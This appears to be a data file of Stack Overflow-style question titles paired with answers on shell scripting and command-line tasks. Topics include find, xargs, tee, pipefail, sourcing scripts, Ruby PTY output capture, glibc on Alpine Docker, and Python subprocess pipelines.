    "How search for files using regex in linux shell script [closed]": "Find all .py files.\nfind / -name '*.py'\nFind files with the word \"python\" in the name.\nfind / -name '*python*'\nSame as above but case-insensitive.\nfind / -iname '*python*'\nRegex match, more flexible. Find both .py files and files with the word \"python\" in the name.\nfind / -regex '.*python.*\\|.*\\.py'",
    "How to define array in multiple lines in Shell": "If you want to print the whole array, you need:\necho ${messages[@]}",
    "xargs with multiple arguments": "Don't listen to all of them. :) Just look at this example:\necho argument1 argument2 argument3 | xargs -l bash -c 'echo this is first:$0 second:$1 third:$2'\nOutput will be:\nthis is first:argument1 second:argument2 third:argument3",
    "Get Current date in epoch from Unix shell script": "The Unix Date command will display in epoch time\nthe command is\ndate +\"%s\"\nhttps://linux.die.net/man/1/date\nEdit: Some people have observed you asked for days, so it's the result of that command divided by 86,400",
    "Android ADB commands to get the device properties": "",
    "Continuously read from STDOUT of external process in Ruby": "I've had some success in solving this problem of mine. Here are the details, with some explanations, in case anyone having a similar problem finds this page. But if you don't care for details, here's the short answer:\nUse PTY.spawn in the following manner (with your own command of course):\nrequire 'pty'\ncmd = \"blender -b mball.blend -o //renders/ -F JPEG -x 1 -f 1\" \nbegin\n  PTY.spawn( cmd ) do |stdout, stdin, pid|\n    begin\n      # Do stuff with the output here. Just printing to show it works\n      stdout.each { |line| print line }\n    rescue Errno::EIO\n      puts \"Errno:EIO error, but this probably just means \" +\n            \"that the process has finished giving output\"\n    end\n  end\nrescue PTY::ChildExited\n  puts \"The child process exited!\"\nend\nAnd here's the long answer, with way too many details:\nThe real issue seems to be that if a process doesn't explicitly flush its stdout, then anything written to stdout is buffered rather than actually sent, until the process is done, so as to minimize IO (this is apparently an implementation detail of many C libraries, made so that throughput is maximized through less frequent IO). If you can easily modify the process so that it flushes stdout regularly, then that would be your solution. In my case, it was blender, so a bit intimidating for a complete noob such as myself to modify the source.\nBut when you run these processes from the shell, they display stdout to the shell in real-time, and the stdout doesn't seem to be buffered. It's only buffered when called from another process I believe, but if a shell is being dealt with, the stdout is seen in real time, unbuffered.\nThis behavior can even be observed with a ruby process as the child process whose output must be collected in real time. Just create a script, random.rb, with the following line:\n5.times { |i| sleep( 3*rand ); puts \"#{i}\" }\nThen a ruby script to call it and return its output:\nIO.popen( \"ruby random.rb\") do |random|\n  random.each { |line| puts line }\nend\nYou'll see that you don't get the result in real-time as you might expect, but all at once afterwards. STDOUT is being buffered, even though if you run random.rb yourself, it isn't buffered. This can be solved by adding a STDOUT.flush statement inside the block in random.rb. But if you can't change the source, you have to work around this. You can't flush it from outside the process.\nIf the subprocess can print to shell in real-time, then there must be a way to capture this with Ruby in real-time as well. And there is. You have to use the PTY module, included in ruby core I believe (1.8.6 anyways). Sad thing is that it's not documented. But I found some examples of use fortunately.\nFirst, to explain what PTY is, it stands for pseudo terminal. Basically, it allows the ruby script to present itself to the subprocess as if it's a real user who has just typed the command into a shell. So any altered behavior that occurs only when a user has started the process through a shell (such as the STDOUT not being buffered, in this case) will occur. Concealing the fact that another process has started this process allows you to collect the STDOUT in real-time, as it isn't being buffered.\nTo make this work with the random.rb script as the child, try the following code:\nrequire 'pty'\nbegin\n  PTY.spawn( \"ruby random.rb\" ) do |stdout, stdin, pid|\n    begin\n      stdout.each { |line| print line }\n    rescue Errno::EIO\n    end\n  end\nrescue PTY::ChildExited\n  puts \"The child process exited!\"\nend",
    "Shell Script: How to write a string to file and to stdout on console?": "Use the tee command:\necho \"hello\" | tee logfile.txt",
    "How to run a shell script when a file or directory changes?": "You may try entr tool to run arbitrary commands when files change. Example for files:\n$ ls -d * | entr sh -c 'make && make test'\nor:\n$ ls *.css *.html | entr reload-browser Firefox\nor print Changed! when file file.txt is saved:\n$ echo file.txt | entr echo Changed!\nFor directories use -d, but you've to use it in the loop, e.g.:\nwhile true; do find path/ | entr -d echo Changed; done\nor:\nwhile true; do ls path/* | entr -pd echo Changed; done",
    "Replacement for source in sh": "The dot command '.' is the equivalent of the C Shell (and Bash) source command. It is specified by POSIX (see dot), and supported by the Bourne and Korn shells (and zsh, I believe).\n. somefile\nNote that the shell looks for the file using $PATH, but the file only has to be readable, not executable.\nAs noted in the comments below, you can of course specify a relative or absolute pathname for the file \u2014 any name containing a slash will not be searched for using $PATH. So:\n. /some/where/somefile\n. some/where/somefile\n. ./somefile\ncould all be used to find somefile if it existed in the three different specified locations (if you could replace . with ls -l and see a file listed).\nPedants of the world unite! Yes, if the current directory is the root directory, then /some/where/somefile and ./some/where/somefile would refer to the same file \u2014 with the same real path \u2014 even without links, symbolic or hard, playing a role (and so would ../../some/where/somefile).",
    "How to store command results in a shell variable? [duplicate]": "The syntax to store the command output into a variable is var=$(command).\nSo you can directly do:\nresult=$(ls -l | grep -c \"rahul.*patle\")\nAnd the variable $result will contain the number of matches.",
    "Remember GPG password when signing git commits": "You can set a timeout period for gpg-agent in ~/.gnupg/gpg-agent.conf with this line:\ndefault-cache-ttl 3600\nThat would tell gpg-agent to store the passphrase for one hour. You wouldn't want it to be indefinite, but not constantly typing it is of benefit too.",
    "What is the meaning of set -o pipefail in Bash Script?": "man bash says\npipefail\nIf set, the return value of a pipeline is the value of the last (rightmost) command to exit with a non-zero status, or zero if all commands in the pipeline exit successfully. This option is disabled by default.\nWhere \"pipeline\" is\ncommand1 | command2 | command3\nWithout pipefail, the return value of a pipeline is the exit status of the last command in the pipeline, regardless of whether previous commands failed.\nExample:\n$ grep ^root /etc/passwd | cut -f 5 -d :\nSystem Administrator\n$ echo $?\n0\n$ grep ^nonexistant_user /etc/passwd | cut -f 5 -d :\n$ echo $?\n0\n$ set -o pipefail\n$ grep ^nonexistant_user /etc/passwd | cut -f 5 -d :\n$ echo $?\n1",
    "Installing and Running MongoDB on OSX": "If you have installed mongodb through homebrew then you can simply start mongodb through (mongodb-community if installted mongodb-community\nbrew services start mongodb\nOR\nbrew services start mongodb-community\nThen access the shell by\nmongo\nYou can shut down your db by\nbrew services stop mongodb\nYou can restart your db by\nbrew services restart mongodb\nFor more options\nbrew info mongodb",
    "How do I suppress shell script error messages?": "As the other answers state, you can use command 2> /dev/null to throw away the error output from command\nBut what is going on here?\n> is the operator used to redirect output. 2 is a reference to the standard error output stream, i.e. 2> = redirect error output.\n/dev/null is the 'null device' which just swallows any input provided to it. You can combine the two to effectively throw away output from a command.\nFull reference:\n> /dev/null throw away stdout\n1> /dev/null throw away stdout\n2> /dev/null throw away stderr\n&> /dev/null throw away both stdout and stderr",
    "Suppressing diffs for deleted files in git": "In Git versions 1.8.5 and newer, you can do this using the --diff-filter option and specifying \"d\" (lowercase) to tell it to exclude deleted files.\n$ git diff --diff-filter=d\nIn Git versions older than 1.8.5, you can do this with the --diff-filter option and specifying all but the \"D\" (deleted) criteria:\n$ git diff --diff-filter=ACMRTUXB\nFor reference the git documentation of version 2.43.2 says:\n--diff-filter=[(A|C|D|M|R|T|U|X|B)\u2026[*]]\nSelect only files that are Added (A), Copied (C), Deleted (D), Modified (M), Renamed (R), have their type (i.e. regular file, symlink, submodule, \u2026) changed (T), are Unmerged (U), are Unknown (X), or have had their pairing Broken (B). Any combination of the filter characters (including none) can be used. When * (All-or-none) is added to the combination, all paths are selected if there is any file that matches other criteria in the comparison; if there is no file that matches other criteria, nothing is selected.\nAlso, these upper-case letters can be downcased to exclude. E.g. --diff-filter=ad excludes added and deleted paths.\nNote that not all diffs can feature all types. For instance, copied and renamed entries cannot appear if detection for those types is disabled.",
    "How can you untar more than one file at a time?": "What's going on here?\nOriginally, the tar command was intended for use with magnetic tape devices. Since it only made sense to execute tar on one device at a time, the syntax was designed to assume one and only one device. The first file or directory passed was assumed to be the device that held the archive in question and any other files or directories where the contents of the archive to be included in the operation. So for tar extraction (the x option), the first file passed would be the archive and all other files would be the files to be extracted. So if there are two *.tar files (say a.tar and b.tar) your command would expand to:\n$ tar xf a.tar b.tar\nUnless a.tar contains a file named b.tar, the tar command has nothing to do and exits quietly. Annoyingly, the Solaris version of tar does not report any problems either in the return code or with the verbose option (v). Meanwhile, GNU tar returns 2 and spams STDERR even with the verbose option off:\ntar: b.tar: Not found in archive\ntar: Exiting with failure status due to previous errors\nHow do I untar a bunch of files at once?\nIt's too late rewrite tar to accept multiple archive files as input, but it's not too hard to work around the limitation.\nFor most people, running tar multiple times for multiple archives is the most expedient option. Passing just one filename to tar xf will extract all the archived files as one would expect. One approach is to use a shell for loop:\n$ for f in *.tar; do tar xf \"$f\"; done\nAnother method is to use xargs:\n$ ls *.tar | xargs -i tar xf {}\nAlternatively, you can use one of a number of alternative tar file readers. Finally, the truly dedicated programmer could easily write an tar replacement that works exactly as desired. The format is straightforward and many programming languages have libraries available to read tar files. If you are a Perl programmer, for instance, take a look at the Archive::Tar module.\nA warning\nBlindly untarring a bunch of files can cause unexpected problems. The most obvious is that a particular file name may be included in more than one tar file. Since tar overwrites files by default, the exact version of the file you end up with will depend on the order the archives are processed. More troubling, you may end up with a corrupted copy of the file if you try this \"clever\" optimization:\nfor f in *.tar; do\n  tar xf \"$f\" &\ndone\nwait\nIf both a.tar and b.tar contain the same file and try to extract it at the same time, the results are unpredictable.\nA related issue, especially when taking archives from an untrusted source, is the possibility of a tarbomb.\nOne partial solution would be to automatically create a new directory to extract into:\nfor f in *.tar; do \n  d=`basename \"$f\" .tar`\n  mkdir \"$d\"\n  (cd \"$d\" && tar xf \"../$f\")\ndone\nThis won't help if a file is specified in the archive with an absolute path (which is normally a sign of malicious intent). Adding that sort of check is left as an exercise for the reader.",
    "How can I send the stdout of one process to multiple processes using (preferably unnamed) pipes in Unix (or Windows)?": "Editor's note:\n- >(\u2026) is a process substitution that is a nonstandard shell feature of some POSIX-compatible shells: bash, ksh, zsh.\n- This answer accidentally sends the output process substitution's output through the pipeline too: echo 123 | tee >(tr 1 a) | tr 1 b.\n- Output from the process substitutions will be unpredictably interleaved, and, except in zsh, the pipeline may terminate before the commands inside >(\u2026) do.\nIn unix (or on a mac), use the tee command:\n$ echo 123 | tee >(tr 1 a) >(tr 1 b) >/dev/null\nb23\na23\nUsually you would use tee to redirect output to multiple files, but using >(...) you can redirect to another process. So, in general,\n$ proc1 | tee >(proc2) ... >(procN-1) >(procN) >/dev/null\nwill do what you want.\nUnder windows, I don't think the built-in shell has an equivalent. Microsoft's Windows PowerShell has a tee command though.",
    "in linux terminal, how do I show the folder's last modification date, taking its content into consideration?": "Something like:\nfind /path/ -type f -exec stat \\{} --printf=\"%y\\n\" \\; | \n     sort -n -r | \n     head -n 1\nExplanation:\nthe find command will print modification time for every file recursively ignoring directories (according to the comment by IQAndreas you can't rely on the folders timestamps)\nsort -n (numerically) -r (reverse)\nhead -n 1: get the first entry",
    "Are there any languages that compile to Bash?": "You could also try Batsh, which is a DSL (Domain-Specific Language) that compiles a C-syntax language to Bash (and Windows Batch).\nProject\nOnline demo",
    "does linux shell support list data structure?": "It supports lists, but not as a separate data structure (ignoring arrays for the moment).\nThe for loop iterates over a list (in the generic sense) of white-space separated values, regardless of how that list is created, whether literally:\nfor i in 1 2 3; do\n    echo \"$i\"\ndone\nor via parameter expansion:\nlistVar=\"1 2 3\"\nfor i in $listVar; do\n    echo \"$i\"\ndone\nor command substitution:\nfor i in $(echo 1; echo 2; echo 3); do\n    echo \"$i\"\ndone\nAn array is just a special parameter which can contain a more structured list of value, where each element can itself contain whitespace. Compare the difference:\narray=(\"item 1\" \"item 2\" \"item 3\")\nfor i in \"${array[@]}\"; do   # The quotes are necessary here\n    echo \"$i\"\ndone\n\nlist='\"item 1\" \"item 2\" \"item 3\"'\nfor i in $list; do\n    echo $i\ndone\nfor i in \"$list\"; do\n    echo $i\ndone\nfor i in ${array[@]}; do\n    echo $i\ndone",
    "Shell script to capture Process ID and kill it if exist [duplicate]": "Actually the easiest way to do that would be to pass kill arguments like below:\nps -ef | grep your_process_name | grep -v grep | awk '{print $2}' | xargs kill",
    "is there an escape character for envsubst?": "If you give envsubst a list of variables, it only substitutes those variables, ignoring other substitutions. I'm not exactly sure how it works, but something like the following seems to do what you want:\n$ export THIS=THAT FOO=BAR\n$ echo 'dont substitute $THIS but do substitute $FOO' | envsubst '$FOO'\ndont substitute $THIS but do substitute BAR\nNote that $THIS is left alone, but $FOO is replaced by BAR.",
    "Exclude list of files from find": "I don't think find has an option like this, you could build a command using printf and your exclude list:\nfind /dir -name \"*.gz\" $(printf \"! -name %s \" $(cat skip_files))\nWhich is the same as doing:\nfind /dir -name \"*.gz\" ! -name first_skip ! -name second_skip .... etc\nAlternatively you can pipe from find into grep:\nfind /dir -name \"*.gz\" | grep -vFf skip_files",
    "Get SQL query count during a Django shell session": "You can use connection.queries:\n>>> from django.conf import settings\n>>> settings.DEBUG = True\n>>> from django.db import connection\n>>> Model.objects.count()\n>>> print(len(connection.queries))\n1",
    "What are my environment variables? [closed]": "I am not sure if thats what you want, but try printenv\nThis will show you all your environment variables.\nAbout where they are stored\nLinux: where are environment variables stored?\nHow to set Shell Environment Variables\nhttp://www.codecoffee.com/tipsforlinux/articles/030.html\nHappy reading :-)",
    "Exception handling in shell scripting?": "There is not really a try/catch in bash (i assume you're using bash), but you can achieve a quite similar behaviour using && or ||.\nIn this example, you want to run fallback_command if a_command fails (returns a non-zero value):\na_command || fallback_command\nAnd in this example, you want to execute second_command if a_command is successful (returns 0):\na_command && second_command\nThey can easily be mixed together by using a subshell, for example, the following command will execute a_command, if it succeeds it will then run other_command, but if a_command or other_command fails, fallback_command will be executed:\n(a_command && other_command) || fallback_command",
    "How to pass argument in Expect through the command line in a shell script": "If you want to read from arguments, you can achieve this simply by\nset username [lindex $argv 0];\nset password [lindex $argv 1];\nAnd print it\nsend_user \"$username $password\"\nThat script will print\n$ ./test.exp user1 pass1\nuser1 pass1\nYou can use Debug mode\n$ ./test.exp -d user1 pass1",
    "Write output to a file after piped to jq": "Just calling jq without a filter will throw errors if stdout isn't a terminal\n$ curl https://jsonplaceholder.typicode.com/posts/1 | jq > test.txt\njq - commandline JSON processor [version 1.5-1-a5b5cbe]\nUsage: jq [options] <jq filter> [file...]\n\n        jq is a tool for processing JSON inputs, applying the\n        given filter to its JSON text inputs and producing the\n[...]\nTry jq '.' (i.e: pretty-print the input JSON):\n$ curl https://jsonplaceholder.typicode.com/posts/1 | jq '.' > test.txt\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   292  100   292    0     0   1698      0 --:--:-- --:--:-- --:--:--  1707\nNote that the filter is not really optional:\nFrom man jq:\nJQ(1)                                                                                JQ(1)\n\nNAME\n       jq - Command-line JSON processor\n\nSYNOPSIS\n       jq [options...] filter [files...]\nAccording to the tip of the master branch... your described (and my observed) behaviour is not expected...\nOlder versions of jq have the following: (here)\nif (!program && isatty(STDOUT_FILENO) && !isatty(STDIN_FILENO))\n  program = \".\";\ni.e: use a default filter if stdout is a TTY, and stdin is not a TTY.\nThis behaviour appears to be corrected in commit 5fe05367, with the following snippet of code:\nif (!program && (!isatty(STDOUT_FILENO) || !isatty(STDIN_FILENO)))\n  program = \".\";",
    "Docker Alpine executable binary not found even if in PATH": "On Alpine Linux, the not found error is a typical symptom of dynamic link failure. It is indeed a rather confusing error by musl's ldd linker.\nMost of the world Linux software is linked against glibc, the GNU libc library (libc provides the standard C library and POSIX API). Most Linux distributions are based on glibc. OTOH, Alpine Linux is based on the musl libc library, which is a minimal implementation and strictly POSIX compliant. Executables built on glibc distributions depend on /lib/x86_64-linux-gnu/libc.so.6, for example, which is not available on Alpine (unless, they are statically linked).\nExcept for this dependency, it's important to note that while musl attempts to maintain glibc compatibility to some extent, it is far from being fully compatible, and complex software that's built against glibc won't work with musl-libc, so simply symlinking /lib/ld-musl-x86_64.so.1 to the glibc path isn't likely going to work.\nGenerally, there are several ways for running glibc binaries on Alpine:\nInstall one the glibc compatibility packages, libc6-compat or gcompat:\n# apk add gcompat\napk add libc6-compat\nBoth packages provide a light weight glibc compatibility layer which may be suitable for running simple glibc applications. libc6-compat implements glibc compatibility APIs and provides symlinks to glibc shared libraries such as libm.so, libpthread.so and libcrypt.so. The gcompat package is based on Adelie Linux gcompat project and does the same but provides a single library libgcompat.so. Both libraries install loader stubs. Depdending on the application, one of them may work while the other won't, so it's good to try both.\nInstall proper glibc on Alpine, for providing all glibc methods and functionalities. There are glibc builds available for Alpine, which should be installed in the following procedure (example):\n# Source: https://github.com/anapsix/docker-alpine-java\n\nENV GLIBC_REPO=https://github.com/sgerrand/alpine-pkg-glibc\nENV GLIBC_VERSION=2.30-r0\n\nRUN set -ex && \\\n    apk --update add libstdc++ curl ca-certificates && \\\n    for pkg in glibc-${GLIBC_VERSION} glibc-bin-${GLIBC_VERSION}; \\\n        do curl -sSL ${GLIBC_REPO}/releases/download/${GLIBC_VERSION}/${pkg}.apk -o /tmp/${pkg}.apk; done && \\\n    apk add --allow-untrusted /tmp/*.apk && \\\n    rm -v /tmp/*.apk && \\\n    /usr/glibc-compat/sbin/ldconfig /lib /usr/glibc-compat/lib\nUse statically linked executables. Static executables don't carry dynamic dependencies and could run on any Linux.\nAlternatively, the software may be built from source on Alpine.\nFor LibreDWG, let's first verify the issue:\n/usr/local/bin # ./dwg2dxf\n/bin/sh: ./dwg2dxf: not found\n/usr/local/bin\n/usr/local/bin # ldd ./dwg2dxf\n    /lib64/ld-linux-x86-64.so.2 (0x7fd375538000)\n    libredwg.so.0 => /usr/local/lib/libredwg.so.0 (0x7fd3744db000)\n    libm.so.6 => /lib64/ld-linux-x86-64.so.2 (0x7fd375538000)\n    libc.so.6 => /lib64/ld-linux-x86-64.so.2 (0x7fd375538000)\nError relocating /usr/local/lib/libredwg.so.0: __strcat_chk: symbol not found\nError relocating /usr/local/lib/libredwg.so.0: __snprintf_chk: symbol not found\nError relocating /usr/local/lib/libredwg.so.0: __memcpy_chk: symbol not found\nError relocating /usr/local/lib/libredwg.so.0: __stpcpy_chk: symbol not found\nError relocating /usr/local/lib/libredwg.so.0: __strcpy_chk: symbol not found\nError relocating /usr/local/lib/libredwg.so.0: __printf_chk: symbol not found\nError relocating /usr/local/lib/libredwg.so.0: __fprintf_chk: symbol not found\nError relocating /usr/local/lib/libredwg.so.0: __strncat_chk: symbol not found\nError relocating /usr/local/lib/libredwg.so.0: __sprintf_chk: symbol not found\nError relocating ./dwg2dxf: __snprintf_chk: symbol not found\nError relocating ./dwg2dxf: __printf_chk: symbol not found\nError relocating ./dwg2dxf: __fprintf_chk: symbol not found\nYou can see that dwg2dxf depends on several glibc symbols. Now, let's follow option 2 for installing glibc:\n/usr/src/app # cd /usr/local/bin\n/usr/local/bin # ls\ndwg2SVG     dwg2dxf     dwgadd      dwgbmp      dwgfilter   dwggrep     dwglayers   dwgread     dwgrewrite  dwgwrite    dxf2dwg     dxfwrite\n/usr/local/bin # ./dwg2dxf\n/bin/sh: ./dwg2dxf: not found\n/usr/local/bin # export GLIBC_REPO=https://github.com/sgerrand/alpine-pkg-glibc && \\\n> export GLIBC_VERSION=2.30-r0 && \\\n> apk --update add libstdc++ curl ca-certificates && \\\n> for pkg in glibc-${GLIBC_VERSION} glibc-bin-${GLIBC_VERSION}; \\\n>    do curl -sSL ${GLIBC_REPO}/releases/download/${GLIBC_VERSION}/${pkg}.apk -o /tmp/${pkg}.apk; done && \\\n> apk add --allow-untrusted /tmp/*.apk && \\\n> rm -v /tmp/*.apk && \\\n> /usr/glibc-compat/sbin/ldconfig /lib /usr/glibc-compat/lib\nfetch https://dl-cdn.alpinelinux.org/alpine/v3.13/main/x86_64/APKINDEX.tar.gz\nfetch https://dl-cdn.alpinelinux.org/alpine/v3.13/community/x86_64/APKINDEX.tar.gz\n(1/1) Installing curl (7.74.0-r1)\nExecuting busybox-1.32.1-r3.trigger\nOK: 629 MiB in 126 packages\n(1/2) Installing glibc (2.30-r0)\n(2/2) Installing glibc-bin (2.30-r0)\nExecuting glibc-bin-2.30-r0.trigger\n/usr/glibc-compat/sbin/ldconfig: /usr/local/lib/libredwg.so.0 is not a symbolic link\n/usr/glibc-compat/sbin/ldconfig: /usr/glibc-compat/lib/ld-linux-x86-64.so.2 is not a symbolic link\nOK: 640 MiB in 128 packages\nremoved '/tmp/glibc-2.30-r0.apk'\nremoved '/tmp/glibc-bin-2.30-r0.apk'\n/usr/glibc-compat/sbin/ldconfig: /usr/glibc-compat/lib/ld-linux-x86-64.so.2 is not a symbolic link\n\n/usr/glibc-compat/sbin/ldconfig: /usr/local/lib/libredwg.so.0 is not a symbolic link\nVoila:\n/usr/local/bin # ./dwg2dxf\n\nUsage: dwg2dxf [-v[N]] [--as rNNNN] [-m|--minimal] [-b|--binary] DWGFILES...",
    "How to execute a shell script on a remote server using Ansible?": "you can use script module\nExample\n- name: Transfer and execute a script.\n  hosts: all\n  tasks:\n\n     - name: Copy and Execute the script \n       script: /home/user/userScript.sh",
    "echo >&2 \"some text\" what does it mean in shell scripting": "To quickly explain what the others missed:\necho \"hey\" >&2\n> redirect standard output (implicit 1>)\n& what comes next is a file descriptor, not a file (only for right hand side of >)\n2 stderr file descriptor number\nRedirect stdout from echo command to stderr. (If you were to useecho \"hey\" >2 you would output hey to a file called 2)",
    "File not found error when launching a subprocess containing piped commands": "You have to add shell=True to execute a shell command. check_output is trying to find an executable called: date | grep -o -w '\"+tz+\"'' | wc -w and cannot find it. (no idea why you removed the essential information from the error message).\nSee the difference between:\n>>> subprocess.check_output('date | grep 1')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/usr/lib/python3.4/subprocess.py\", line 603, in check_output\n    with Popen(*popenargs, stdout=PIPE, **kwargs) as process:\n  File \"/usr/lib/python3.4/subprocess.py\", line 848, in __init__\n    restore_signals, start_new_session)\n  File \"/usr/lib/python3.4/subprocess.py\", line 1446, in _execute_child\n    raise child_exception_type(errno_num, err_msg)\nFileNotFoundError: [Errno 2] No such file or directory: 'date | grep 1'\nAnd:\n>>> subprocess.check_output('date | grep 1', shell=True)\nb'gio 19 giu 2014, 14.15.35, CEST\\n'\nRead the documentation about the Frequently Used Arguments for more information about the shell argument and how it changes the interpretation of the other arguments.\nNote that you should try to avoid using shell=True since spawning a shell can be a security hazard (even if you do not execute untrusted input attacks like Shellshock can still be performed!).\nThe documentation for the subprocess module has a little section about replacing the shell pipeline. You can do so by spawning the two processes in python and use subprocess.PIPE:\ndate_proc = subprocess.Popen(['date'], stdout=subprocess.PIPE)\ngrep_proc = subprocess.check_output(['grep', '1'], stdin=date_proc.stdout, stdout=subprocess.PIPE)\ndate_proc.stdout.close()\noutput = grep_proc.communicate()[0]\nYou can write some simple wrapper function to easily define pipelines:\nimport subprocess\nfrom shlex import split\nfrom collections import namedtuple\nfrom functools import reduce\n\nproc_output = namedtuple('proc_output', 'stdout stderr')\n\n\ndef pipeline(starter_command, *commands):\n    if not commands:\n        try:\n            starter_command, *commands = starter_command.split('|')\n        except AttributeError:\n            pass\n    starter_command = _parse(starter_command)\n    starter = subprocess.Popen(starter_command, stdout=subprocess.PIPE)\n    last_proc = reduce(_create_pipe, map(_parse, commands), starter)\n    return proc_output(*last_proc.communicate())\n\ndef _create_pipe(previous, command):\n    proc = subprocess.Popen(command, stdin=previous.stdout, stdout=subprocess.PIPE)\n    previous.stdout.close()\n    return proc\n\ndef _parse(cmd):\n    try:\n        return split(cmd)\n    except Exception:\n        return cmd\nWith this in place you can write pipeline('date | grep 1') or pipeline('date', 'grep 1') or pipeline(['date'], ['grep', '1'])",
    "LINES and COLUMNS environmental variables lost in a script": "You could get the lines and columns from tput:\n#!/bin/bash\n\nlines=$(tput lines)\ncolumns=$(tput cols)\n\necho \"Lines: \" $lines\necho \"Columns: \" $columns",
    "execute commands as user after Vagrant provisioning": "You should be able to do this using the Vagrant Shell provisioner, e.g.\nVagrant.configure(\"2\") do |config|\n  $script = <<-SCRIPT\n  rbenv install 2.0.0-p353\n  rbenv global 2.0.0-p353\n  gem update --system\n  yes | gem update\n  gem install rdoc\n  gem install rails pg\n  SCRIPT\n\n  config.vm.provision \"shell\", inline: $script, privileged: false\nend\nThe key is to specify privileged: false so that it will use the default user and not root.",
    "How can I tell whether I'm in a screen?": "Check $STY. If it's null, you're on a \"real\" terminal. If it contains anything, it's the name of the screen you're in.\nIf you are not in screen:\neric@dev ~ $ echo $STY\neric@dev ~ $ \nIf you are in screen:\neric@dev ~ $ echo $STY\n2026.pts-0.ip-10-0-1-71",
    "Command line execution in different folder": "The subprocess module is a very good solution.\nimport subprocess\np = subprocess.Popen([command, argument1,...], cwd=working_directory)\np.wait()\nIt has also arguments for modifying environment variables, redirecting input/output to the calling program, etc.",
    "Docker compose won't find $PWD environment variable": "You don't need ${PWD} for this, you can just make the path relative and compose will expand it (one major difference between compose paths and those processed by docker run).\nversion: '2'\nservices:\n  couchpotato:\n    build:\n        context: ./couchpotato\n        dockerfile: Dockerfile\n    ports:\n     - 5050:5050\n    volumes:\n     - \"./couchpotato/data:/home/CouchPotato/data/\"\n     - \"./couchpotato/config:/home/CouchPotato/config/\"\nAs for why compose doesn't see this variable, that depends on your shell. Compose looks for an exported environment variable, contents of the .env file, and command line flags to the docker-compose command. If each of those comes up empty for the variable, you'll get that warning.",
    "What is the difference between using `sh` and `source`?": "When you call source or . (the one is an alias to the other. source cmd not POSIX - kind of bashism), you load and execute a shell script into the current shell process. So you can\nread variables set in the sourced script,\nuse functions defined within it.\nand even execute forks and/or subprocess if script do this.\nWhen you call sh, you initiate a fork (sub-process or child) that runs a new session of /bin/sh (which is often a symbolic link to bash). In this case, environment variables set by the sub-script would be dropped when the sub-script terminate.\nCaution: sh could be a symlink to another\nshell\n.\nPractical sample\nFor example, if you want to change current working directory by a specific manner, you could not do\n$ cat <<eof >myCd2Doc.sh\n#!/bin/sh\ncd /usr/share/doc\neof\n\n$ chmod +x myCd2Doc.sh\nThis won't do what you expect:\n$ cd /tmp\n$ pwd\n/tmp\n$ ~/myCd2Doc.sh\n$ pwd\n/tmp\nbecause current working dir is part of environment and myCd2Doc.sh would run in a subshell.\nBut:\n$ source ~/myCd2Doc.sh\n$ pwd\n/usr/share/doc\nSame, for declaring a function:\n$ cat >~/myCd2Doc.source <<eof\n# Shell source file\nmyCd2Doc() {\n    cd /usr/share/doc\n}\neof\n\n$ . ~/myCd2Doc.source\n$ cd /tmp\n$ pwd\n/tmp\n$ myCd2Doc\n$ pwd\n/usr/share/doc\nHave a look at mycd function!! (With\nbash\ncompletion based on Associative Array).\nExecution level $SHLVL\n$ cd /tmp\nprintf %b '\\43\\41/bin/bash\\necho This is level \\44SHLVL.\\n' >qlvl.sh\n\n$ bash qlvl.sh \nThis is level 2.\n\n$ source qlvl.sh \nThis is level 1.\nRecursion (when a script run from itself)\n$ cat <<\"eoqlvl2\" >qlvl2.sh \n#!/bin/bash\n\nexport startLevel recursionLimit=5\necho This is level $SHLVL started:${startLevel:=$SHLVL}.\n(( SHLVL < recursionLimit )) && ./qlvl2.sh\neoqlvl2\n$ chmod +x qlvl2.sh\n\n$ ./qlvl2.sh \nThis is level 2 started:2.\nThis is level 3 started:2.\nThis is level 4 started:2.\nThis is level 5 started:2.\n\n$ source qlv2.sh \nThis is level 1 started:1.\nThis is level 2 started:1.\nThis is level 3 started:1.\nThis is level 4 started:1.\nThis is level 5 started:1.\nA little futher\n$ sed '$a ps --sid $SID fw' qlvl.sh >qlvl3.sh\n$ chmod +x qlvl3.sh \n$ export SID\n$ read SID < <(ps ho sid $$)\n$ echo $SID $$\n8983 8983\n( Current PID ($$ == process Id) are same identifier than SID (session ID). It's not alway true.)\n$ ./qlvl3.sh \nThis is level 2.\n  PID TTY      STAT   TIME COMMAND\n 8983 pts/10   Ss     0:00 /bin/bash\n10266 pts/10   S+     0:00  \\_ /bin/bash ./qlvl3.sh\n10267 pts/10   R+     0:00      \\_ ps --sid 8983 fw\n\n$ . qlvl3.sh \nThis is level 1.\n  PID TTY      STAT   TIME COMMAND\n 8983 pts/10   Ss     0:00 /bin/bash\n10428 pts/10   R+     0:00  \\_ ps --sid 8983 fw\nDot . is an alias of source. So the only difference between two command are slash replaced by space.\nAnd a final test:\n$ printf %b '\\43\\41/bin/bash\\necho Ending this.\\nsle' \\\n    'ep 1;exit 0\\n' >finalTest.sh\n\n$ bash finalTest.sh \nEnding this.\n\n$ source finalTest.sh\nEnding this.\n... You may notice a different behaviour between the two syntaxes. ;-)",
    "Shell Script Syntax Error: Unexpected End of File [duplicate]": "Edit: Note that the original post has been edited since this answer was written and has been reformatted. You should look at the history to see the original formatting to understand the context for this answer.\nThis error occurs often when you have mismatched structure - that is, you do not have matching double quotes, matching single quotes, have not closed a control structure such as a missing fi with an if, or a missing done with a for.\nThe best way to spot these is to use correct indentation, which will show you where you have a broken control structure, and syntax highlighting, which will show you where quotes are not matched.\nIn this particular case, I can see you are missing a fi. In the latter part of your code, you have 5 ifs and 4 fis. However you also have a number of other problems - your backquoted touch /tmp/alert.txt... command is syntactically invalid, and you need a space before the closing bracket of an if test.\nClean up your code, and errors start to stand out.",
    "How do I measure duration in seconds in a shell script?": "Using the time command, as others have suggested, is a good idea.\nAnother option is to use the magic built-in variable $SECONDS, which contains the number of seconds since the script started executing. You can say:\nSTART_TIME=$SECONDS\ndosomething\nELAPSED_TIME=$(($SECONDS - $START_TIME))\nI think this is bash-specific, but since you're on Linux, I assume you're using bash.",
